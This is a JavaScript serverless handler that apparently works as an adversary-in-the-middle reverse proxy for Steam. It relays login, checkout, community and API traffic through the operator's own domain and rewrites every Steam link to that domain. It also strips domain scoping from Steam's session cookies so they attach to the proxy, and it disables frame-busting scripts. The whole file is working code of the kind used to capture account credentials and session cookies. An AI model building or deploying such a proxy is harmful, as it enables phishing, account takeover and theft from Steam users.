module.exports = async function handler(req, res) {
  const urlPath = req.url || '/';

  let targetDomain = 'https://store.steampowered.com';
  
  if (urlPath.startsWith('/login') || 
      urlPath.startsWith('/profiles') || 
      urlPath.startsWith('/id') || 
      urlPath.startsWith('/market') || 
      urlPath.startsWith('/workshop') ||
      urlPath.startsWith('/discussions') ||
      urlPath.startsWith('/chat')) {
    targetDomain = 'https://steamcommunity.com';
  } else if (urlPath.startsWith('/en/') || urlPath.startsWith('/wizard/')) {
    targetDomain = 'https://help.steampowered.com';
  } else if (urlPath.startsWith('/valve/')) {
    targetDomain = 'https://www.valvesoftware.com';
  } else if (urlPath.startsWith('/partner/')) {
    targetDomain = 'https://partner.steamgames.com';
  } else if (urlPath.startsWith('/api_proxy/')) {
    targetDomain = 'https://api.steampowered.com';
  }

  let steamUrl = targetDomain + urlPath
      .replace('/partner', '')
      .replace('/valve', '')
      .replace('/api_proxy', '');

  if (targetDomain === 'https://store.steampowered.com' || targetDomain === 'https://steamcommunity.com' || targetDomain === 'https://help.steampowered.com') {
      steamUrl = targetDomain + urlPath;
  }

  try {
    const headers = {
      'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
      'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    };
    if (req.headers.cookie) headers['Cookie'] = req.headers.cookie;

    let bodyData = undefined;
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      if (typeof req.body === 'object') {
        bodyData = JSON.stringify(req.body);
        headers['Content-Type'] = 'application/json';
      } else {
        bodyData = req.body;
      }
    }

    const response = await fetch(steamUrl, {
      method: req.method,
      headers: headers,
      body: bodyData,
      redirect: 'manual'
    });

    const contentType = response.headers.get('content-type') || '';
    const myDomain = `${req.headers['x-forwarded-proto'] || 'https'}://${req.headers.host}`;
    const hostName = req.headers.host;

    if (response.status >= 300 && response.status < 400) {
      let location = response.headers.get('location');
      if (location) {
        location = location.replace(/https?:\/\/store\.steampowered\.com/gi, myDomain);
        location = location.replace(/https?:\/\/steamcommunity\.com/gi, myDomain);
        location = location.replace(/https?:\/\/help\.steampowered\.com/gi, myDomain);
        location = location.replace(/https?:\/\/www\.valvesoftware\.com/gi, myDomain + '/valve');
        location = location.replace(/https?:\/\/partner\.steamgames\.com/gi, myDomain + '/partner');
        location = location.replace(/https?:\/\/checkout\.steampowered\.com/gi, myDomain);
        location = location.replace(/https?:\/\/login\.steampowered\.com/gi, myDomain);
        
        location = location.replace(/store\.steampowered\.com/gi, hostName);
        location = location.replace(/steamcommunity\.com/gi, hostName);
        res.setHeader('Location', location);
        return res.status(response.status).end();
      }
    }

    const setCookie = response.headers.get('set-cookie');
    if (setCookie) {
      let newCookie = setCookie.replace(/domain=\.steampowered\.com;/gi, '');
      newCookie = newCookie.replace(/domain=\.steamcommunity\.com;/gi, '');
      res.setHeader('Set-Cookie', newCookie); 
    }

    if (contentType.includes('text/html') || contentType.includes('application/json') || contentType.includes('application/javascript')) {
      let html = await response.text();
      
      html = html.replace(/https?:\/\/store\.steampowered\.com/gi, myDomain);
      html = html.replace(/https?:\\\/\\\/store\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
      html = html.replace(/store\.steampowered\.com/gi, hostName);
      
      html = html.replace(/https?:\/\/help\.steampowered\.com\/en\//gi, myDomain + '/en/');
      html = html.replace(/https?:\/\/help\.steampowered\.com\/wizard\//gi, myDomain + '/wizard/');
      html = html.replace(/https?:\\\/\\\/help\.steampowered\.com\\\/en\\\//gi, myDomain.replace(/\//g, '\\/') + '\\/en\\/');
      html = html.replace(/https?:\\\/\\\/help\.steampowered\.com\\\/wizard\\\//gi, myDomain.replace(/\//g, '\\/') + '\\/wizard\\/');
      
      html = html.replace(/https?:\/\/steamcommunity\.com\/login/gi, myDomain + '/login');
      html = html.replace(/https?:\/\/steamcommunity\.com\/profiles/gi, myDomain + '/profiles');
      html = html.replace(/https?:\/\/steamcommunity\.com\/id/gi, myDomain + '/id');
      html = html.replace(/https?:\/\/steamcommunity\.com\/market/gi, myDomain + '/market');
      html = html.replace(/https?:\/\/steamcommunity\.com\/workshop/gi, myDomain + '/workshop');
      html = html.replace(/https?:\/\/steamcommunity\.com\/discussions/gi, myDomain + '/discussions');
      html = html.replace(/https?:\/\/steamcommunity\.com\/chat/gi, myDomain + '/chat');
      
      html = html.replace(/https?:\\\/\\\/steamcommunity\.com\\\/login/gi, myDomain.replace(/\//g, '\\/') + '\\/login');
      html = html.replace(/https?:\\\/\\\/steamcommunity\.com\\\/profiles/gi, myDomain.replace(/\//g, '\\/') + '\\/profiles');
      
      html = html.replace(/https?:\/\/www\.valvesoftware\.com/gi, myDomain + '/valve');
      html = html.replace(/https?:\/\/valvesoftware\.com/gi, myDomain + '/valve');
      html = html.replace(/https?:\/\/partner\.steamgames\.com/gi, myDomain + '/partner');
      html = html.replace(/https?:\/\/checkout\.steampowered\.com/gi, myDomain);
      html = html.replace(/https?:\/\/login\.steampowered\.com/gi, myDomain);
      
      html = html.replace(/https?:\\\/\\\/checkout\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
      html = html.replace(/https?:\\\/\\\/login\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
      
      // Rewrite WEBAPI Base URL in JSON configs
      html = html.replace(/https?:\/\/api\.steampowered\.com/gi, myDomain + '/api_proxy');
      html = html.replace(/https?:\\\/\\\/api\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/') + '\\/api_proxy');
      
      html = html.replace(/window\.top\.location/gi, "window.self.location");
      
      res.setHeader('Content-Type', contentType);
      return res.status(response.status).send(html);
    } 

    const buffer = await response.arrayBuffer();
    res.setHeader('Content-Type', contentType);
    return res.status(response.status).send(Buffer.from(buffer));

  } catch (error) {
    console.error('Proxy Error:', error);
    res.status(500).send('Live Proxy Error: ' + error.message + ' URL: ' + steamUrl);
  }
}
